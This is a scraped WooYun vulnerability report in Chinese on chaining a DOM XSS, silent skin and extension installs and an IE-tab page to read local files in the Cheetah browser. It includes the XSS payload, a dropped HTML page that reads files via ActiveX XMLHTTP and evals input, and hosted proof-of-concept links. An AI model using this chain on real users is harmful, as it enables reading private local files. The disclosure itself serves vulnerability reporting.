{"id": 28970, "wybug_id": "wooyun-2015-0102031", "wybug_title": "猎豹安全浏览器本地文件读取", "wybug_corp": "金山软件集团", "wybug_author": "路人甲", "wybug_date": "2015-03-18 10:01", "wybug_open_date": "2015-06-16 10:56", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计错误", "浏览器"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向公众公开  简要描述： V5.2.85.9680 详细说明：  总体过程如下：\n\n上述流程中每一个点的说明如下：1. tuan.duba.com的XSShttp://tuan.duba.com/category/?cateid=3&city_code=aaaaaaaaaaaaaaaa#0<img src=1 onerror=alert(1)>这个dom xss缺陷代码位于 http://tuan.duba.com/adminstatic/images/ad/show.js\n$(document).ready(function(){\tvar hash = window.location.hash.toString();\tif(hash&&hash!=\"#\"){\t\tif( hash.indexOf(\"#\") >-1){\t\t\thash = hash.replace(\"#\",\"\");\t\t}\t\tvar hash2 = parseInt(hash,10);\t\tif(isNaN(hash2)){\t\t\t\t//非数字则表示排行榜\t\t\t//$(\"#\"+hash).Mwt_tip_box({width:\"190px\",height:\"250px\",border_color:\"#ffa300\"});\t\t}else{\t\t$(\"#\"+hash).Mwt_tip_box({width:\"270px\",height:\"301px\",border_color:\"#D9020C\"});\t\t}\t}});\n可见代码对hash部分parseInt后，进行了isNaN(hash2)的判断，所以 <img src=1 onerror=alert(1)> 前面加了一个 数字（0），就绕过了这处判断，导致XSS。2. 猎豹浏览器的设计中，只要所访问的crx是皮肤文件（manifest.json里的theme属性为true）时，则不会有交互提示，而直接安装皮肤，这使得我们可以通过这种方式，静默的写入一些文件到本地，比如html，这里我们在皮肤压缩包里打包了一个xss.html\n<html>\t<body>\t<script>\t\tvar data=location.search.substr(1);\t\tif(/^url=/.test(data)){\t\t\tdata=data.replace(/^url=/,\"\");\t\t\tvar x=new ActiveXObject(\"MSXML2.XMLHTTP\");\t\t\tx.open(\"GET\",decodeURIComponent(data),false);\t\t\tx.send(null);\t\t\talert(x.responseText);\t\t}else{\t\t\teval(decodeURIComponent(data));\t\t}\t</script>\t</body></html>\n然后生成chrome的crx文件：\n\n只需要 location.href=\"http://xxxxxx.com/xxx.crx\" 即可将xxx.crx里的内容释放到形式如下的目录路径中：C:\\Documents and Settings\\Administrator\\Local Settings\\Application Data\\liebao\\User Data\\Default\\Extensions\\皮肤ID\\版本_0\\xss.html其中“版本”与manifest.json文件里的版本字段有关，这里我们构造的是\"version\": \"20.10\"看看chrome下的行为：皮肤安装也会有交互提示。\n\n3. 静默安装插件。此问题已有报告，但未被重视，所以新版本也并未修复。见（ WooYun: 猎豹浏览器远程代码执行 ）这次我们安装的是IE tab插件。4. 打开任意协议下的URL。external.JumpToNewURL(…) 函数可用于打开任意协议下的URL，这里我们用来打开 IE tab这个扩展的html文件。chrome-extension://hehijbfgiekmjfkfjpbkbammjbdenadd/u.htm#url=[前面所释放的xss.html所在路径]比如XP下是：\"C:\\\\Documents and Settings\\\\用户名\\\\Local Settings\\\\Application Data\\\\liebao\\\\User Data\\\\Default\\\\Extensions\\\\\";缺点是：需要知道用户名，这里假定目标用户使用默认的administrator。5. 最终，通过IE tab 打开本地域下的xss.html，IE内核下，本地域执行JS可以通过xmlhttp读取本地文件。\n\n当然也可以读取远程内容，但由于IE tab 与chrome在cookies数据上并不共享，危害相对较小。   漏洞证明：  1. 攻击目标用户是administrator的情况下。直接访问：http://xsst.sinaapp.com/poc/liebao_poc.htm（非定向攻击）2. 如果目标用户用户名是 xxx，则可发送：http://xsst.sinaapp.com/poc/liebao_poc.htm?xxx 让目标进行访问。（定向攻击，需先通过一定手段获取用户名）\n\n   修复方案：  见详细说明。不要只是删除市场里的应用。 删了A应用，也许B应用也会出问题的。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-03-18 10:55 厂商回复： 收到，辛苦了！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-18 10:05 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  关注    \n     2015-03-18 10:07 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  二哥？    \n     2015-03-18 10:19 |    \t\tWinck \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://weibo.com/hackwinck hackwinck  By...)\t\t \n  关注    \n     2015-03-18 10:21 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  屌屌的    \n     2015-03-18 13:27 |    \t\tWinck \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | http://weibo.com/hackwinck hackwinck  By...)\t\t \n  屌屌的    \n     2015-06-16 19:31 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  可以不要把静默两个字标红么    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}